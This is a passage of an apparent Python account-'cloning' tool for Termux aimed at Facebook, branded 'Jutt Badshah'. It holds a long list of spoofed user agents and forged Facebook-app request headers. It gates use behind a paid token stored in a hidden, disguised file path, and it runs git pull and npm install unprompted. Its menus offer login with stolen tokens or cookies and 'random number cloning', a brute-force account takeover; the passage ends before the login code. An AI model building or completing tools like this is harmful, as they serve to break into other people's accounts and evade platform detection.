  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:46.0) Gecko/20100101 Firefox/46.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/80.0.3987.87 Chrome/80.0.3987.87 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36",
  "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.120 Chrome/37.0.2062.120 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:53.0) Gecko/20100101 Firefox/53.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/76.0.3809.100 Chrome/76.0.3809.100 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/49.0.2623.108 Chrome/49.0.2623.108 Safari/537.36",
  "Wget/1.17.1 (linux-gnu)",
  "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:44.0) Gecko/20100101 Firefox/44.0",
  "Mozilla/5.0 (X11; Linux x86_64; rv:33.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:10.0) Gecko/20100101 Firefox/10.0",
  "Mozilla/5.0 (X11; Linux x86_64; rv:37.0) Gecko/20100101 Firefox/37.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:59.0) Gecko/20100101 Firefox/59.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36",
  "Mozilla/5.0 (SMART-TV; Linux; Tizen 5.0) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.2 Chrome/63.0.3239.84 TV Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/70.0.3538.77 Chrome/70.0.3538.77 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
  "Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3",
  "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.172 Safari/537.22",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:63.0) Gecko/20100101 Firefox/63.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.59 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/76.0.3809.87 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/68.0.3419.0 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0",
  "Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/52.0.2743.116 Chrome/52.0.2743.116 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.183 Safari/537.36 Vivaldi/1.96.1137.3",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 http://notifyninja.com/monitoring",
  "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Thunderbird/45.8.0",
  "WirtschaftsWoche-iOS-1.1.14-20200824.1315",
  "[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0) Gecko/20100101 Thunderbird/60.7.0 Lightning/6.2.7",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MAAR; .NET4.0C; .NET4.0E; BRI/2)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/6.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729; McAfee; MAARJS)",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MAARJS; rv:11.0) like Gecko",
  "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; eSobiSubscriber 2.0.4.16; MAAR)",
  "Outlook-Express/7.0 (MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; eSobiSubscriber 1.0.0.40; BRI/2; MAAR; .NET CLR 1.1.4322; TmstmpExt)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MAAR; InfoPath.1; .NET4.0C; OfficeLiveConnector.1.5; OfficeLivePatch.1.3; .NET4.0E)",
  "DoCoMo/2.0 P903i(c100;TB;W24H12)",
  "DoCoMo/2.0 P903i",
  "DoCoMo/2.0 SH10C(c500;TB;W16H12)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; MAFS; Microsoft Outlook 14.0.7162; ms-office; MSOffice 14)",
  "HTC-3100/1.2 Mozilla/4.0 (compatible; MSIE 5.5; Windows CE; Smartphone; 240x320) UP.Link/6.3.0.0.0",
  "HTC-3100/1.2 Mozilla/4.0 (compatible; MSIE 5.5; Windows CE; Smartphone; 240x320)",
  "com.mobile.indiapp 2.0.5.5 phone HTC7088 android 16 fa zz normal long high 540 960",
  "Mogujie4Android/NAMhuawei/1290",
  "Mozilla/5.0 (Linux; Android 10; AGR-AL09HN Build/HUAWEIAGR-AL09HN; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; ANA-LX9 Build/HUAWEIANA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; U; Android; 2.3.8; sv-se; Nexus 1 Build/HUAWEI_X3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
  "Mozilla/5.0 (Android; 4.0.4; Mobile; Huawei X3; rv:13.0) Gecko/13.0 Firefox/13.0",
  "Mozilla/5.0 (Android; Mobile Huawei X3; rv:13.0) Gecko/13.0 Firefox/13.0",
  "Mozilla/5.0 (Linux; U; Android; 2.3.7; sv-se; Nexus 0 Build/HUAWEIX3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Safari/533.1",
  "Mozilla/5.0 (Linux; U; Android; 2.3.8; sv-se; Nexus 3 Build/HUAWEI_X3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
  "Mozilla/5.0 (Linux; U; Android 2.3.8; sv-se; Huawei X3 Build/HuaweiSocialPhone) AppleWebKit/534.15 (KHTML, like Gecko) CrMo/32.0.1005.22 Mobile Safari/534.15",
  "Mozilla/5.0 (Linux; Android 8.1.0; LG-H932BK Build/OPM6.171019.030.K1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.3497.100 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/193.0.0.45.101;]",
  "nokia-7.1-safari",
  "NOKIA6120cUCBrowser/8.7.1.234/28/444/UCWEB",
  "Mozilla/5.0 (Linux; U; Android 4.1.2; en-au; GT-I8730T Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/61.0.0.15.69;]",
  "Mozilla/5.0 (Linux; U; Android 4.1.2; en-gb; GT-I8730T Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/79.0.0.18.71;]",
  "Mozilla/5.0 (Linux; Android 4.1.2; GT-I8730T Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36 OPR/50.6.2426.201126",
  "Mozilla/5.0 (Linux; Android 4.4.2; GT-193011 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 Mobile UCBrowser/3.4.3.532",
  "Mozilla/5.0 (Linux; U; Android 4.0.4; de-de; SonyEricssonMT11i Build/Xperia Ultimate HD™ 3.0.2) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
  "Mozilla/5.0 (Android; Mobile; rv:30.0) Gecko/30.0 Firefox/30.0",
  "Mozilla/5.0 (Android; Tablet; rv:30.0) Gecko/30.0 Firefox/30.0",
  "Mozilla/5.0 (Windows NT 6.2; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (Macintosh; PPC Mac OS X 10.6; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (X11; Linux i686; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (Maemo; Linux armv7l; rv:10.0) Gecko/20100101 Firefox/10.0 Fennec/10.0",
  "Mozilla/5.0 (Mobile; rv:26.0) Gecko/26.0 Firefox/26.0",
  "Mozilla/5.0 (Tablet; rv:26.0) Gecko/26.0 Firefox/26.0",
  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36 RuxitSynthetic/1.0 v9646582432 t38550 ath9b965f92 altpub cvcv=2",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36",
  "Mozilla/5.0 (Linux; ; ) AppleWebKit/ (KHTML, like Gecko) Chrome/ Mobile Safari/",
  "Mozilla/5.0 (Linux; Android 4.4; Nexus 5 Build/_BuildID_) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.65 Mobile Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0",
  "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254",
  "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; RM-1127_16056) AppleWebKit/537.36(KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10536",
  "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058",
  "Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 6.0.1; SGP771 Build/32.2.A.0.253; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 6.0.1; SHIELD Tablet K1 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 7.0; SM-T827R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T550 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
  "Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9",
  "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Nexus Player Build/MMB29T)",
  "Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTMM Build/NS6264) CTV",
  "Dalvik/2.1.0 (Linux; U; Android 9; SM-N950U Build/PPR1.180610.011)",
  "Dalvik/1.6.0 (Linux; U; Android 4.4.4; WT19M-FI Build/KTU84Q)",
  "Dalvik/2.1.0 (Linux; U; Android 9; SM-N960U Build/PPR1.180610.011)",
  "Dalvik/2.1.0 (Linux; U; Android 9; SM-G955U Build/PPR1.180610.011)",
  "Dalvik/2.1.0 (Linux; U; Android 10; SM-G965U Build/QP1A.190711.020)",
  "Dalvik/2.1.0 (Linux; U; Android 10; SM-G965U Build/QP1A.190711.020)",
  "Dalvik/2.1.0 (Linux; U; Android 10; SM-N960U Build/QP1A.190711.020)",
  "Dalvik/2.1.0 (Linux; U; Android 10; SM-G975U Build/QP1A.190711.020)",
  "Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTBAMR311 Build/NS6264) CTV",
  "Dalvik/2.1.0 (Linux; U; Android 9; SM-A102U Build/PPR1.180610.011)",
  "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G935V Build/R16NW)",
  "Mozilla/5.0 (Linux; U; Android 4.4.4; sk-sk; SAMSUNG SM-G357FZ/G357FZXXU1AQJ1 Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
  "Mozilla/5.0 (Linux; U; Android 4.4.2; pl-pl; SM-T310 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30",
  "Mozilla/5.0 (Linux; U; Android 4.2.2;pl-pl; Lenovo S5000-F/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2.2 Mobile Safari/534.30",
  "Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
  "WeRead/5.2.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/5.3.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/5.2.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
  "WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29)",
  "WeRead/5.2.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
  "WeRead/5.2.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; CDY-NX9A Build/HUAWEICDY-N29)",
  "WeRead/5.1.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 7.0; BTV-W09 Build/HUAWEIBEETHOVEN-W09)",
  "WeRead/5.1.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/5.1.0 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
  "WeRead/5.0.3 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
  "WeRead/5.0.5 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/4.2.3 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)",
  "WeRead/4.1.5 WRBrand/Huawei Dalvik/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09)",
  "WeRead/3.5.0 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0; DIG-AL00 Build/HUAWEIDIG-AL00)",
  "WeRead/4.1.1 WRBrand/Huawei Dalvik/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09)",
  "WeRead/4.1.1 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)",
  "Dalvik/2.1.0 (Linux; U; Android 5.1)",
  "Dalvik/1.6.0 (Linux; U; Android 4.0.4; GT-P7510 Build/IMM76D)"
  "Dalvik/2.1.0 (Linux; U; Android 5.1; AFTM Build/LMY47O)",
  "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=720,height=1440}",
  "Dalvik/1.6.0 (Linux; U; Android 4.4.2; ASUS_T00Q Build/KVT49L)UNTRUSTED/1.0C-1.1; Opera Mini/att/4.2",
  "Dalvik/1.4.0 (Linux; U; Android 2.3.6; HUAWEI Y210-0100 Build/HuaweiY210-0100)",
  "Dalvik/1.4.0 (Linux; U; Android 2.3.6; GT-S5570 Build/GINGERBREAD)",
  "Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; Galaxy Nexus Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.3",
  "Dalvik/1.6.0 (Linux; U; Android 4.2.2; Galaxy Nexus Build/JDQ39)",
  "Mozilla/5.0 (iPad; CPU OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60",
  "Dalvik/2.1.0 (Linux; U; Android 5.1; PRO 5 Build/LMY47D)",
  "Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36",
  "Mozilla/5.0 (Windows IoT 10.0; Android 6.0.1; WebView/3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Mobile Safari/537.36 Edge/17.17134",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"
]
birth = ['01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', '23', '24', '25', '26', '27', '28']
bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000, 40000)
f = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36", "Mozilla/5.0 (Windows IoT 10.0; Android 6.0.1; WebView/3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Mobile Safari/537.36 Edge/17.17134"]
ua = random.choice(agents)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': repr(ua), 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
os.system('git pull')
os.system('clear')
logo = """
\x1b[1;91m
\x1b[1;92m
\x1b[1;96m
\x1b[1;92m         {|} {|}  {|} {|}{|}{|} {|}{|}{|}
\x1b[1;97m         {|} {|}  {|}    {|}       {|}
\x1b[1;93m         {|} {|}  {|}    {|}       {|}
\x1b[1;96m         {|} {|}  {|}    {|}       {|}
\x1b[1;94m     {|}{|}   {|}{|}     {|}       {|}
\x1b[1;93m
\x1b[1;92m         Jutt Badshah Brand~
\x1b[1;91m-----------------------------------------------
\x1b[1;97m\xe2\x9e\xa3 Author : Jutt Badshah
\x1b[1;97m\xe2\x9e\xa3 Github : https://github.com/SHOOTER-MAKER
\x1b[1;97m\xe2\x9e\xa3 WP  NO : +923007574310
\x1b[1;91m-----------------------------------------------"""


def wg():
    os.system('clear')
    jalan(logo)
    print ('')
    jalan('%sWelcome %sTo %sJutt %sBadshah Tool%s' % (M, warna1, warna2, warna3, O))
    time.sleep(1)
    print ('')
    jalan('%sEnjoy %sAnd %sKeep %sSmile%s' % (K, warna1, warna2, warna3, M))
    time.sleep(1)
    reg()


def reg():
    os.system('clear')
    print (logo)
    print ('')
    print ('\x1b[1;37mTake The Approval For Login Charges 350')
    print ('')
    time.sleep(1)
    try:
        to = open('/data/data/com.termux/files/usr/share/doc/xz/examples/.‎‎xozofile', 'r').read()
    except (KeyError, IOError):
        reg2()

    r = requests.get('https://raw.githubusercontent.com/rashidali711/rashidali/main/server.txt').text
    if to in r:
        os.system('cd ..... && npm install')
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('cd ..... && node index.js &')
        time.sleep(10)
        main_menu()
    else:
        os.system('clear')
        print (logo)
        print ('\tApproved Failed')
        print (' \x1b[1;92mYour Token Is Not Approved Already ')
        print (' \x1b[1;92mCopy Token and send to Me WP\x1b[1;97m')
        print (47*'-')
        print (' \x1b[1;92mYour Token: ' + to)
        print (47*'\033[1;97m-')
        raw_input('\x1b[1;93m Press enter to send Token\033[1;97m')
        os.system('xdg-open https://wa.me/+923007574310')
        reg()


def reg2():
    os.system('clear')
    print (logo)
    print ('\tApproval not detected')
    print (' \x1b[1;92mCopy and press enter And select whatsapp to continue\x1b[1;97m')
    id = uuid.uuid4().hex[:50]
    print (47*'-')
    print ('\033[1;92m Your Token: ' + id)
    print (47*'\033[1;97m-')
    print ('\t\033[0;30mJutt')
    sav = open('/data/data/com.termux/files/usr/share/doc/xz/examples/.‎‎xozofile', 'w')
    sav.write(id)
    sav.close()
    raw_input('\t\033[1;93m Press enter to go to whatsapp\033[1;97m ')
    os.system('xdg-open https://wa.me/+923007574310')
    print ('')
    raw_input('\t\x1b[1;92m Press enter to check Approval\033[1;97m ')
    reg()


def main_menu():
    os.system("clear")
    print (logo)
    print("")
    print("\033[1;93m~~~~~~~~~Main menu~~~~~~~~~")
    print(47*"-")
    print("\033[1;92m[1] Login cloning\n")
    print("\033[1;92m[2] Without Login Random number cloning\n")
    print("\033[1;92m[3] Join My WP Group\033[1;97m")
    print(47*"-")
    print("\033[1;93mFor Any Problem Select 3 And Join My WP Group\033[1;97m")
    print("")
    print(47*"-")
    main_menu_sel()


def main_menu_sel():
    sel = raw_input("\033[1;96mChoose option: \033[1;97m")
    if sel == "1":
        log_menu()
    elif sel == "2":
        ran()
    elif sel == "3":
        os.system("xdg-open https://chat.whatsapp.com/D3Q3WpXWWbv4klHfVGZ4JK")
        main_menu()
    else:
        print("")
        print("\033[1;97mSelect valid option\033[1;37m")
        print("")
        main_menu_sel()


def log_menu():
    try:
        t_check = open('access_token.txt', 'r')
        jutt_menu()
    except (KeyError, IOError):
        os.system('clear')
        print (logo)
        print ('\x1b[1;93m ~~~~ Login menu ~~~~\x1b[1;97m')
        print (47 * '-')
        print ('\x1b[1;92m[1] Login with Email Pass')
        print ('\x1b[1;92m[2] Login with token')
        print ('\x1b[1;92m[3] Login with cookies')
        print ('\x1b[1;92m[4] Get Token For Login\x1b[1;97m')
        print ('\x1b[1;92m[5] Join My WP Group\x1b[1;97m')
        print ('\033[1;92m[0] Back\033[1;97m')
        print (47* '-')
        print ('\x1b[1;93mSelect 2 And Login With Token\033[1;97m')
        print (47*'-')
        print ('')
        log_menu_s()


def log_menu_s():
    sel = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80Jutt\xe2\x9e\xa4 ')
    if sel == '1':
        log_fb()
    elif sel == '2':
        log_token()
    elif sel == '3':
        log_cookie()
    elif sel == '4':
        gen_token()
    elif sel == '5':
        os.system('xdg-open https://chat.whatsapp.com/D3Q3WpXWWbv4klHfVGZ4JK')
        log_menu()
    elif sel == '0':
        main_menu()
    else:
        print ('')
        print ('\\ Select valid option ')
        print ('')
        log_menu_s()


def log_fb():
    os.system('clear')
    print (logo)
